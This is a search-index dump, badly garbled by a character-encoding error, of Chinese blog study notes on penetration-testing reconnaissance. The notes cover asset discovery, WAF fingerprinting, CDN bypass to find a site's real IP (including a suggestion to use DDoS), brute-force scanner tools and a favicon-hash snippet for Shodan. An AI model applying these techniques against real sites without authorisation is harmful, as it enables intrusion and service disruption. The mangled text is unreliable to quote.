æ¶‰åŠèµ„æº12345https://crt.sh/https://dnsdb.io/https://sc.ftqq.com/3.versionhttps://tools.ipip.net/cdn.phphttps://github.com/bit4woo/teemohttps://securitytrails.com/domain/www.baidu.com/history/a","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","permalink":"https://al0nez.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"09ä¿¡æ¯æ”¶é›†--APPåŠå…¶ä»–èµ„äº§ç­‰","slug":"09ä¿¡æ¯æ”¶é›†-APPåŠå…¶ä»–èµ„äº§ç­‰","date":"2021-09-21T02:27:17.000Z","updated":"2021-09-21T06:05:48.295Z","comments":true,"path":"2021/09/21/09ä¿¡æ¯æ”¶é›†-APPåŠå…¶ä»–èµ„äº§ç­‰/","link":"","permalink":"https://al0nez.github.io/2021/09/21/09%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-APP%E5%8F%8A%E5%85%B6%E4%BB%96%E8%B5%84%E4%BA%A7%E7%AD%89/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€åœ¨å®‰å…¨æµ‹è¯•ä¸­ï¼Œè‹¥ WEB æ— æ³•å–å¾—è¿›å±•æˆ–æ—  WEB çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ© APP æˆ–å…¶ä»–èµ„äº§åœ¨è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œä»è€Œå¼€å±•åç»­æ¸—é€ï¼Œé‚£ä¹ˆå…¶ä¸­çš„ä¿¡æ¯æ”¶é›†å°±å°¤ä¸ºé‡è¦ã€‚ APPæå–ä¸€é”®åç¼–è¯‘æå–APPæŠ“æ•°æ®åŒ…è¿›è¡Œå·¥å…·é…åˆå„ç§ç¬¬ä¸‰æ–¹åº”ç”¨ç›¸å…³æ¢é’ˆæŠ€æœ¯å„ç§æœåŠ¡æ¥å£ä¿¡æ¯ç›¸å…³æ¢é’ˆæŠ€æœ¯APPæå–åŠæŠ“åŒ…åŠåç»­é…åˆæŸ APK ä¸€é”®æå–åç¼–è¯‘åˆ©ç”¨ burp å†å²æŠ“æ›´å¤š URLæŸ IP æ—  WEB æ¡†æ¶ä¸‹çš„ç¬¬ä¸‰æ–¹æµ‹è¯• æŸIPæ— webæ¡†æ¶ä¸‹çš„ç¬¬ä¸‰æ–¹æµ‹è¯•å„ç§ç«¯å£ä¸€é¡¿ä¹±æ‰«-æ€è·¯ shodan ç«¯å£8332ï¼šå‘ç°å‡ºç°ç™»å½•æ¡† å‘ç°RomPager ï¼Œç™¾åº¦ä¸€ä¸‹ 628ç«¯å£å‘ç°è¿™ä¸ª fofaå‘ç° å„ç§æ¥å£ä¸€é¡¿ä¹±æ‰«-æ€è·¯ æ¥å£éƒ¨åˆ†ä¸€é¡¿æµ‹è¯•-æ€è·¯ æ—ç«™æŸ¥è¯¢ Cæ®µæŸ¥è¯¢ ç±»ä¼¼åŸŸåç«™ç‚¹-å¤‡æ¡ˆæŸ¥è¯¢ï¼šæ‰¾ç½‘å€ï¼Œå†pingå‡ºipåœ°å€ï¼Œå†ç”¨é»‘æš—å¼•æ“æœç´¢å†…å®¹ æ¼”ç¤ºï¼šæŸä¼ é”€ç½‘ç«™ä¿¡æ¯æ”¶é›† fofaæœç´¢ å‘ç°MongoDB-æ•°æ®åº“ï¼Œå­˜åœ¨çˆ†ç ´å¯èƒ½ å‘ç°FTPæœåŠ¡ å‘ç°OpenSSH7.6 ç™¾åº¦å‘ç°å­˜åœ¨ç”¨æˆ·æšä¸¾æ¼æ´ è·å–åˆ°ip fofoå­åŸŸåå‘ç° æŸ¥è¯¢å…¶å­åŸŸå Cæ®µæŸ¥è¯¢ å¤‡æ¡ˆæŸ¥è¯¢ é€šè¿‡å®˜ç½‘åç§°æœç´¢ä¿¡æ¯ æœç´¢phpæœ‰å…³ç•Œé¢ æœç´¢æ—¶å‘ç°.xyzçš„åŸŸå /robots.txt å‘ç°æœ‰ç”¨ä¿¡æ¯ å‘ç°CMSä¿¡æ¯ å­åŸŸåæŸ¥è¯¢IP é»‘æš—å¼•æ“æœç´¢æœ‰å…³ç«¯å£ä¿¡æ¯ç­‰ æœç´¢ æŸ¥çœ‹æ¼æ´ å°è¯•admin â€‹ æ¶‰åŠèµ„æºï¼š12345https://fofa.so/http://tool.chinaz.comhttps://www.shodan.io/https://www.zoomeye.org/https://nmap.org/download.html","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","permalink":"https://al0nez.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"08ä¿¡æ¯æ”¶é›†--æ¶æ„ï¼Œæ­å»ºï¼ŒWAF","slug":"08ä¿¡æ¯æ”¶é›†-æ¶æ„ï¼Œæ­å»ºï¼ŒWAF","date":"2021-09-21T02:26:50.000Z","updated":"2021-09-21T06:05:53.249Z","comments":true,"path":"2021/09/21/08ä¿¡æ¯æ”¶é›†-æ¶æ„ï¼Œæ­å»ºï¼ŒWAF/","link":"","permalink":"https://al0nez.github.io/2021/09/21/08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€åœ¨å®‰å…¨æµ‹è¯•ä¸­ï¼Œä¿¡æ¯æ”¶é›†æ˜¯éå¸¸é‡è¦çš„ä¸€ä¸ªç¯èŠ‚ï¼Œæ­¤ç¯èŠ‚çš„ä¿¡æ¯å°†å½±å“åˆ°åç»­çš„æˆåŠŸå‡ ç‡ï¼ŒæŒæ¡ä¿¡æ¯çš„å¤šå°‘å°†å†³å®šå‘ç°æ¼æ´æœºä¼šå¤§å°ï¼Œæ¢è¨€ä¹‹å†³å®šç€æ˜¯å¦èƒ½å®Œæˆç›®æ ‡çš„æµ‹è¯•ä»»åŠ¡ã€‚ä¹Ÿå¯ä»¥å¾ˆç›´æ¥çš„è·Ÿå¤§å®¶è¯´ï¼šæ¸—é€æµ‹è¯•çš„æ€è·¯å°±æ˜¯ä»ä¿¡æ¯æ”¶é›†è¿™é‡Œå¼€å§‹ï¼Œä½ ä¸å¤§ç‰›çš„å·®è·ä¹Ÿæ˜¯ä»è¿™é‡Œå¼€å§‹çš„ï¼ ç«™ç‚¹æ­å»ºåˆ†æç›®å½•ç±»ç«™ç‚¹ä¸€ä¸ªç½‘ç«™è·¯å¾„é‡Œè¿˜æœ‰ä¸€ä¸ªç½‘ç«™ï¼Œç›¸å½“äºç½‘ç«™å¥—ç½‘ç«™ã€‚åªè¦ä¿©ä¸ªç½‘ç«™ä¸€ä¸ªé‡Œæœ‰æ¼æ´ï¼Œå°±éƒ½è¢«æ”»å…‹ã€‚ ä¸¤è€…ä»…ä»…æ˜¯ç›®å½•è·¯å¾„ä¸åŒ ç«¯å£ç±»ç«™ç‚¹ä¸€å°æœåŠ¡å™¨ä¸Šï¼Œä¸åŒç«¯å£æœ‰å¥½å‡ ä¸ªç½‘ç«™ï¼Œä¸€å°ç½‘ç«™å‡ºç°é—®é¢˜ï¼Œå…¶ä»–ç½‘ç«™ä¹Ÿä¼šè¢«æ”»å‡» â€‹ å­åŸŸåç«™ç‚¹ä¿©ä¸ªç½‘ç«™æœ‰å¯èƒ½ä¸åœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Š bbs.goodlift.neté‡‡ç”¨Discuzï¼Œä¿©ä¸ªç½‘ç«™ä¿©å¥—CMS ä¸¤ä¸ªç«™ç‚¹å¯èƒ½ä¸åœ¨åŒä¸€ä¸ªæœåŠ¡å™¨ ç±»ä¼¼åŸŸåç«™ç‚¹ å¤šä¸ªåŸŸåï¼ŒåŒä¸€ä¸ªç½‘ç«™ æ—æ³¨ï¼ŒCæ®µç«™ç‚¹æ—ç«™æ¦‚å¿µ 1æ—ç«™æ˜¯å’Œç›®æ ‡ç½‘ç«™åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šçš„å…¶å®ƒçš„ç½‘ç«™ï¼›å¦‚æœä»ç›®æ ‡ç«™æœ¬èº«æ‰¾ä¸åˆ°å¥½çš„å…¥æ‰‹ç‚¹ï¼Œè¿™æ—¶å€™ï¼Œå¦‚æœæƒ³å¿«é€Ÿæ‹¿ä¸‹ç›®æ ‡çš„è¯ï¼Œä¸€èˆ¬éƒ½ä¼šå…ˆæ‰¾ä¸ªç›®æ ‡ç«™ç‚¹æ‰€åœ¨æœåŠ¡å™¨ä¸Šå…¶ä»–çš„æ¯”è¾ƒå¥½æçš„ç«™ä¸‹æ‰‹ï¼Œç„¶åå†æƒ³åŠæ³•è·¨åˆ°çœŸæ­£ç›®æ ‡çš„ç«™ç‚¹ç›®å½•ä¸­ã€‚ Cæ®µæ¦‚å¿µ 1Cæ®µæ˜¯å’Œç›®æ ‡æœºå™¨ipå¤„åœ¨åŒä¸€ä¸ªCæ®µçš„å…¶å®ƒæœºå™¨ï¼›é€šè¿‡ç›®æ ‡æ‰€åœ¨Cæ®µçš„å…¶ä»–ä»»ä¸€å°æœºå™¨ï¼Œæƒ³åŠæ³•è·¨åˆ°æˆ‘ä»¬çš„ç›®æ ‡æœºå™¨ä¸Šã€‚å¸¸ç”¨çš„å·¥å…·æœ‰webscanccï¼ŒNmapï¼ŒZenmapã€‚ åœ¨çº¿æŸ¥è¯¢å·¥å…· 123æ—ç«™å’ŒCæ®µåœ¨çº¿æŸ¥è¯¢åœ°å€ï¼šhttp://www.webscan.cc/http://stool.chinaz.com/same å¸¸ç”¨å·¥å…· 1234webï¼šk8æ—ç«™ã€å¾¡å‰‘1.5K8Cscanå¤§å‹å†…ç½‘æ¸—é€è‡ªå®šä¹‰æ’ä»¶åŒ–æ‰«æç¥å™¨ï¼ŒåŒ…å«ä¿¡æ¯æ”¶é›†ã€ç½‘ç»œèµ„äº§ã€æ¼æ´æ‰«æã€å¯†ç çˆ†ç ´ã€æ¼æ´åˆ©ç”¨ï¼Œç¨‹åºé‡‡ç”¨å¤šçº¿ç¨‹æ‰¹é‡æ‰«æå¤§å‹å†…ç½‘å¤šä¸ªIPæ®µCæ®µä¸»æœºï¼Œç›®å‰æ’ä»¶åŒ…å«: Cæ®µæ—æ³¨æ‰«æã€å­åŸŸåæ‰«æã€Ftpå¯†ç çˆ†ç ´ã€Mysqlå¯†ç çˆ†ç ´ã€Oracleå¯†ç çˆ†ç ´ã€MSSQLå¯†ç çˆ†ç ´ã€Windows/Linuxç³»ç»Ÿå¯†ç çˆ†ç ´ã€å­˜æ´»ä¸»æœºæ‰«æã€ç«¯å£æ‰«æã€Webä¿¡æ¯æ¢æµ‹ã€æ“ä½œç³»ç»Ÿç‰ˆæœ¬æ¢æµ‹ã€Ciscoæ€ç§‘è®¾å¤‡æ‰«æç­‰,æ”¯æŒè°ƒç”¨ä»»æ„å¤–éƒ¨ç¨‹åºæˆ–è„šæœ¬ï¼Œæ”¯æŒCobalt Strikeè”åŠ¨ä¸‹è½½åœ°å€ï¼šhttps://github.com/k8gege/K8CScanæœ€æ–°ç‰ˆLadon https://github.com/k8gege/Ladon æ­å»ºè½¯ä»¶ç‰¹å¾ç«™ç‚¹ä¸€ä½“åŒ–æ­å»ºè½¯ä»¶ï¼šå®å¡”ã€PHPstudyã€WMAPã€INMAPï¼ˆNginx å¸¸è§„çš„æ­å»ºè½¯ä»¶éƒ½æœ‰å¸¸è§„çš„æ•°æ®åº“çš„é»˜è®¤è´¦å·å¯†ç ï¼Œå¦‚æœæ­å»ºè€…ä¸å»æ›´æ”¹çš„è¯ï¼Œå°±èƒ½æˆä¸ºçªç ´æ€è·¯ã€‚ ä¾‹ï¼š Apache/2.4.41(win32)OpenSSL/1.1.1c mod_fcgid/2.3.9a å®å¡” (ä¿¡æ¯å¾ˆå…¨åŸºæœ¬ä¸Šæ˜¯æ­å»ºè½¯ä»¶) Apache/2.4.41(win32)OpenSSL/1.0.2j PHP/5.4.45 é»˜è®¤çš„å®‰å…¨è®¾ç½®(/phpmyadmin root/root) WAFé˜²æŠ¤åˆ†æä»€ä¹ˆæ˜¯WAFåº”ç”¨Webåº”ç”¨é˜²æŠ¤ç³»ç»Ÿ(Web Application Firewall, ç®€ç§°:WAF)ä»£è¡¨äº†ä¸€ç±»æ–°å…´çš„ä¿¡æ¯å®‰å…¨æŠ€æœ¯ï¼Œç”¨ä»¥è§£å†³è¯¸å¦‚é˜²ç«å¢™ä¸€ç±»ä¼ ç»Ÿè®¾å¤‡æŸæ‰‹æ— ç­–çš„Webåº”ç”¨å®‰å…¨é—®é¢˜ã€‚ åˆ†ä¸ºï¼šç¡¬ä»¶å½¢å¼å’Œè½¯ä»¶å½¢å¼ã€‚ åœ¨å®‰å…¨å…¬å¸å•ä½è´­ä¹°çš„é˜²ç«å¢™éƒ½æ˜¯ç¡¬ä»¶ï¼Œä¸ªäººç½‘ç«™å’Œå°ä¼ä¸šæ­å»ºéƒ½æ˜¯è½¯ä»¶ã€‚ å¦‚ä½•å¿«é€Ÿè¯†åˆ«WAFé€šè¿‡wafw00fæ¥è¯†åˆ« ä¸‹è½½åœ°å€ 1https://github.com/EnableSecurity/wafw00f ä½¿ç”¨æ–‡æ¡£ 1https://github.com/enablesecurity/wafw00f/wiki å®‰è£…ç¯å¢ƒ 1python3ç¯å¢ƒ ---&gt;ä½¿ç”¨ pip install wafw00f è¿›è¡Œå®‰è£… Windowsä¸‹å®‰è£…ä½¿ç”¨ 1https://www.cnblogs.com/qingchengzi/articles/13451885.html åˆ¤å®šwafçš„ä¸€ä¸ªæ ‡å‡† æ¶‰åŠèµ„æºhttps://www.shodan.io/ https://www.webscan.cc/ https://github.com/EnableSecurity/wafw00f","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","permalink":"https://al0nez.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"07ä¿¡æ¯æ”¶é›†--CDNç»•è¿‡æŠ€æœ¯","slug":"07ä¿¡æ¯æ”¶é›†-CDNç»•è¿‡æŠ€æœ¯","date":"2021-09-21T02:26:33.000Z","updated":"2021-09-21T06:05:58.305Z","comments":true,"path":"2021/09/21/07ä¿¡æ¯æ”¶é›†-CDNç»•è¿‡æŠ€æœ¯/","link":"","permalink":"https://al0nez.github.io/2021/09/21/07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† CDNCDN çš„å…¨ç§°æ˜¯ Content Delivery Networkï¼Œå³å†…å®¹åˆ†å‘ç½‘ç»œã€‚CDN æ˜¯æ„å»ºåœ¨ç°æœ‰ç½‘ç»œåŸºç¡€ä¹‹ä¸Šçš„æ™ºèƒ½è™šæ‹Ÿç½‘ç»œï¼Œä¾é éƒ¨ç½²åœ¨å„åœ°çš„è¾¹ç¼˜æœåŠ¡å™¨ï¼Œé€šè¿‡ä¸­å¿ƒå¹³å°çš„è´Ÿè½½å‡è¡¡ã€å†…å®¹åˆ†å‘ã€è°ƒåº¦ç­‰åŠŸèƒ½æ¨¡å—ï¼Œä½¿ç”¨æˆ·å°±è¿‘è·å–æ‰€éœ€å†…å®¹ï¼Œé™ä½ç½‘ç»œæ‹¥å¡ï¼Œæé«˜ç”¨æˆ·è®¿é—®å“åº”é€Ÿåº¦å’Œå‘½ä¸­ç‡ã€‚ä½†åœ¨å®‰å…¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œè‹¥ç›®æ ‡å­˜åœ¨ CDN æœåŠ¡ï¼Œå°†ä¼šå½±å“åˆ°åç»­çš„å®‰å…¨æµ‹è¯•è¿‡ç¨‹ã€‚ ç›¸å½“äºä¸€ä¸ªèŠ‚ç‚¹ï¼ŒæŠŠç½‘ç«™ä¸Šçš„ä¸€äº›ç¼“å­˜æ”¾åˆ°cdnä¸­ï¼Œä½ è®¿é—®åˆ°çš„ipä¸æ˜¯åŸç½‘ç«™è€Œæ˜¯cdnã€‚æ‰€æœ‰å¦‚æœéœ€è¦è¿›è¡Œæ¸—é€æµ‹è¯•éœ€è¦ç»•è¿‡cdnï¼Œæ‰¾åˆ°çœŸå®ç½‘ç«™çš„ipã€‚ å¦‚ä½•åˆ¤æ–­ç›®æ ‡å­˜åœ¨ CDN æœåŠ¡ï¼Ÿ1https://ping.chinaz.com åˆ©ç”¨å¤šèŠ‚ç‚¹æŠ€æœ¯è¿›è¡Œè¯·æ±‚è¿”å›åˆ¤æ–­ æœ‰CDNæƒ…å†µï¼š æœ‰å¤šä¸ªIPè¿”å›ï¼Œè¯´æ˜å­˜åœ¨CDN æ— CDNæƒ…å†µ: åªæœ‰1ä¸ªIPè¿”å› CDNç»•è¿‡æŠ€æœ¯å­åŸŸåæŸ¥è¯¢å¦‚æœæˆ‘ä»¬æŸ¥åˆ°ä»–çš„å­åŸŸåçš„ipä¸å˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡pingæ¢æµ‹åŒä¸€ç½‘æ®µçš„ipï¼Œçœ‹ä¸»ç½‘ç«™æ˜¯å¦å’Œä»–åœ¨ä¸€ä¸ªç½‘ç«™ã€‚ é‚®ä»¶æœåŠ¡æŸ¥è¯¢æ ¹æ®å¯¹æ–¹é‚®ä»¶æœåŠ¡å™¨çš„åœ°å€æ¥è·å–å¯¹æ–¹ç½‘ç«™çœŸæ­£çš„ip å›½å¤–åœ°å€è¯·æ±‚å¯ä»¥é€šè¿‡ä¼ªé€ å›½å¤–ipåœ°å€è®¿é—®ç½‘ç«™ï¼Œæ¥è·å–çœŸå®ç½‘ç«™ipï¼Œvpnæ¥ä¼ªé€  é—ç•™æ–‡ä»¶ï¼Œæ‰«æå…¨ç½‘è°·æ­Œæœç´¢æŸ¥çœ‹è¯¥ç½‘ç«™çš„é—ç•™æ–‡ä»¶ï¼Œæ¥è·å–ip eg:phpinfo é»‘æš—å¼•æ“æœç´¢ç‰¹å®šæ–‡ä»¶shodanã€fofaã€ zoomeye DNSå†å²è®°å½•ï¼Œä»¥é‡æ‰“é‡ï¼ˆDDOSï¼‰ DNSè®°å½•æœ‰ä¹‹å‰æ²¡åšCDNæ—¶å€™çš„IPè®°å½•ï¼›DDOSå°†CDNæµé‡æ‰“å®Œï¼Œè®¿é—®çš„å°±æ˜¯çœŸå®IP CDN çœŸå® IP åœ°å€è·å–åç»‘å®šæŒ‡å‘åœ°å€æ›´æ”¹æœ¬åœ° HOSTS è§£ææŒ‡å‘æ–‡ä»¶ æ¼”ç¤ºæ¡ˆä¾‹åˆ©ç”¨å­åŸŸåè¯·æ±‚è·å–IPåœ°å€12xueersi å­åŸŸåä¸Šçš„å°æŠ€å·§www.xueersi.com 1xueersi.com åŸå› ï¼šåªè®¾ç½®äº†www.xueersi.comçš„cdnè§£æï¼Œæ²¡è®¾ç½®xueersi.comçš„cdnè§£æ åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¥å£æŸ¥è¯¢è·å–çœŸå®IPsp910 DNSå†å²è®°å½•=ç¬¬ä¸‰æ–¹æ¥å£ï¼ˆæ¥å£æŸ¥è¯¢ï¼‰ 1https://x.threatbook.cn/ åˆ©ç”¨å›½å¤–åœ°å€è¯·æ±‚è·å–çœŸå®IPm.sp910 å­åŸŸåå°æŠ€å·§/é‡‡é›†/å›½å¤–è¯·æ±‚ï¼ˆåŒç±»å‹è®¿é—® 1m.sp910 åˆ©ç”¨é‚®ä»¶æœåŠ¡å™¨æ¥å£è·å–çœŸå®IPmozhe é‚®ç®±æºç æµ‹è¯•å¯¹æ¯”ç¬¬ä¸‰æ–¹æŸ¥è¯¢ï¼ˆåœ°åŒºåˆ†æï¼‰ æ ¹æ®ipæŸ¥åœ°å€ä¿¡æ¯åˆ¤æ–­å“ªä¸ªæ˜¯çœŸå®ip æˆ–è€…ä¿®æ”¹ç»‘å®šhostæ–‡ä»¶ä¸ºçœŸå®ipï¼Œçœ‹èƒ½å¦è®¿é—® åˆ©ç”¨é»‘æš—å¼•æ“æœç´¢ç‰¹å®šæ–‡ä»¶è·å–çœŸå®IP103.75.182.15:2087é»‘æš—å¼•æ“ï¼ˆshodanæœæŒ‡å®šhashæ–‡ä»¶ï¼‰ 123456import mmh3import requestsresponse=requests.get(&#x27;favicon.ico&#x27;)favicon=response.content.encode(&#x27;base64&#x27;)hash=mmh3.hash(favicon)print &#x27;http.favicon.hash:&#x27;+str(hash) æ¶‰åŠèµ„æºï¼š1234567891011https://www.shodan.iohttps://x.threatbook.cnhttp://ping.chinaz.comhttps://www.get-site-ip.com/https://asm.ca.com/en/ping.phphttps://github.com/Tai7sy/fuckcdnhttps://github.com/boy-hack/w8fuckcdnhttps://mp.weixin.qq.com/s?__biz=MzA5MzQ3MDE1NQ==&amp;mid=2653939118&amp;idx=1&amp;sn=945b81344d9c89431a8c413ff633fc3a&amp;chksm=8b86290abcf1a01cdc00711339884602b5bb474111d3aff2d465182702715087e22c852c158f&amp;token=268417143&amp;lang=zh_CN#rd","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","permalink":"https://al0nez.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"06åŸºç¡€å…¥é—¨--åŠ å¯†ç¼–ç ç®—æ³•","slug":"06åŸºç¡€å…¥é—¨-åŠ å¯†ç¼–ç ç®—æ³•","date":"2021-09-21T02:26:09.000Z","updated":"2021-09-21T06:06:02.043Z","comments":true,"path":"2021/09/21/06åŸºç¡€å…¥é—¨-åŠ å¯†ç¼–ç ç®—æ³•/","link":"","permalink":"https://al0nez.github.io/2021/09/21/06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œå¸¸è§çš„å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ä¼šé‡‡ç”¨åŠ å¯†å¤„ç†ï¼Œå…¶ä¸­ä½œä¸ºå®‰å…¨æµ‹è¯•äººå‘˜å¿…é¡»è¦äº†è§£å¸¸è§çš„åŠ å¯†æ–¹å¼ï¼Œæ‰èƒ½ä¸ºåç»­çš„å®‰å…¨æµ‹è¯•åšå¥½å‡†å¤‡ï¼Œæœ¬æ¬¡è¯¾ç¨‹å°†è®²è§£å„ç§åŠ å¯†ç¼–ç ç­‰çŸ¥è¯†ï¼Œä¾¿äºåæœŸçš„å­¦ä¹ å’Œå‘å±•ã€‚ å¸¸è§åŠ å¯†ç¼–ç ç­‰ç®—æ³•è§£æ1MD5ï¼ŒSHAï¼ŒASCï¼Œè¿›åˆ¶ï¼Œæ—¶é—´æˆ³ï¼ŒURLï¼ŒBASE64ï¼ŒUnescapeï¼ŒAESï¼ŒDES ç­‰ MD5(ä¸å¯é€†)åˆ†ä¸º16ä½å’Œ32ä½ï¼Œå¾ˆå¤šç½‘ç«™ç®¡ç†å‘˜çš„å¯†ç éƒ½ä¼šé‡‡ç”¨md5åŠ å¯†ã€‚ ç‰¹ç‚¹ï¼š32ä½æ•°å­—å­—æ¯ï¼ˆa-fï¼‰æ··åˆï¼Œä¸å¯é€† è§£å¯†å¹³å°ï¼š 12https://cmd5.com/somd5.com/ SHAç‰¹ç‚¹ï¼š40ä½æ•°å­—å­—æ¯ï¼ˆa-fï¼‰æ··åˆï¼Œä¸å¯é€† SHA256/384/512ç‰¹ç‚¹ï¼šå›ºå®šä½æ•°æ•°å­—å­—æ¯ï¼ˆa-fï¼‰æ··åˆï¼Œä¸å¯é€† è¿›åˆ¶è¿›åˆ¶ç¼–ç  æ—¶é—´æˆ³ç½‘ç«™æˆ–è€…æœåŠ¡å™¨è„šæœ¬è¯­è¨€é‡Œç»å¸¸ä¼šä½¿ç”¨ï¼Œä¼šåœ¨æ•°æ®åº“é‡Œç”¨æˆ·ç™»å½•å’Œæ³¨é”€ï¼Œæ³¨å†Œé‡Œä¼šä½¿ç”¨ URLæµè§ˆå™¨ä¹Ÿä¼šè¿›è¡ŒåŠ å¯† BASE64è§„å¾‹ï¼šæ˜æ–‡è¶Šé•¿ï¼Œå¯†æ–‡è¶Šé•¿ ç‰¹ç‚¹ï¼šåŒºåˆ†å¤§å°å†™ï¼Œå¤§å†™å­—æ¯å°å†™å­—æ¯æ•°å­—çš„ç»„åˆã€‚æœ«å°¾æœ‰ä¸€ä¸ªæˆ–ä¸¤ä¸ª== unescapeç‰¹ç‚¹ï¼š%u+4ä½æ•°å­—ï¼Œå¯¹åº”ä¸¤ä½å­—ç¬¦ï¼Œå•æ•°çš„æ—¶å€™æœ€åä¸€ä¸ª%00ï¼ŒåŒæ•°çš„æ—¶å€™æœ€åä¸€ä¸ª%0000 AESæ˜¯ä¸€ç§å®‰å…¨çš„åŠ å¯†æ–¹å¼ï¼Œæ¶‰åŠåˆ°å¯†ç ï¼Œåç§»é‡ï¼Œæ•°æ®å—ï¼Œå¡«å……ï¼Œåœ¨åŠ å¯†æ—¶å€™æ¶‰åŠåˆ°4ç§éšæœºæ€§ã€‚è§£å¯†éš¾åº¦å¤§ã€‚ç”¨base64è§£å¯†å‡ºæ¥æ˜¯ä¹±ç ï¼Œæœ‰å¾ˆå¤§å¯èƒ½æ˜¯AESåŠ å¯†ã€‚æœ‰æ—¶å€™/å‡ºç°åœ¨å­—ç¬¦ä¸²é‡Œé¢ã€‚æ¯”è¾ƒæ³¨é‡å®‰å…¨å’Œå¤§å‹ç½‘ç«™ã€å®‰å…¨æ¯”èµ›æ³¨ï¼šå¿…é¡»æœ‰å¯†ç å’Œåç§»é‡ï¼Œå¦åˆ™æ— æ³•è¿›è¡Œè§£å¯† DESç‰¹ç‚¹ï¼š æ˜æ–‡è¶Šé•¿ï¼Œå¯†æ–‡ä¹Ÿè¶Šé•¿ï¼Œå¯è‡ªå®šä¹‰å¯†ç ï¼Œè¾“å‡ºæœ‰æ—¶å€™å¸¦â€™+â€™ å¸¸è§åŠ å¯†å½¢å¼ç®—æ³•è§£æç›´æ¥åŠ å¯†ï¼Œå¸¦ saltï¼Œå¸¦å¯†ç ï¼Œå¸¦åç§»ï¼Œå¸¦ä½æ•°ï¼Œå¸¦æ¨¡å¼ï¼Œå¸¦å¹²æ‰°ï¼Œè‡ªå®šä¹‰ç»„åˆç­‰ å¸¸è§è§£å¯†æ–¹å¼ï¼ˆé’ˆå¯¹ï¼‰æšä¸¾ï¼Œè‡ªå®šä¹‰é€†å‘ç®—æ³•ï¼Œå¯é€†å‘ äº†è§£å¸¸è§„åŠ å¯†ç®—æ³•çš„ç‰¹æ€§é•¿åº¦ä½æ•°ï¼Œå­—ç¬¦è§„å¾‹ï¼Œä»£ç åˆ†æï¼Œæœç´¢è·å–ç­‰ å·¥å…·123456http://www.jsons.cn/desencrypt/https://www.cmd5.com/https://tool.lu/timestamp/http://tool.chacuo.net/cryptaeshttp://tools.jb51.net/password/des_encodehttp://encode.chahuo.com/ æ¼”ç¤ºæ¡ˆä¾‹SQLæ³¨å…¥æ¼æ´æµ‹è¯•(å‚æ•°åŠ å¯†) å¯ä»¥çœ‹åˆ°idåé¢çš„å‚æ•°æ˜¯ç»è¿‡åŠ å¯†çš„ã€‚ å¾¡å‰‘æ‰«ä¸€ä¸‹åå° å‘ç°æœ‰ä¿©ä¸ªæ–‡ä»¶ 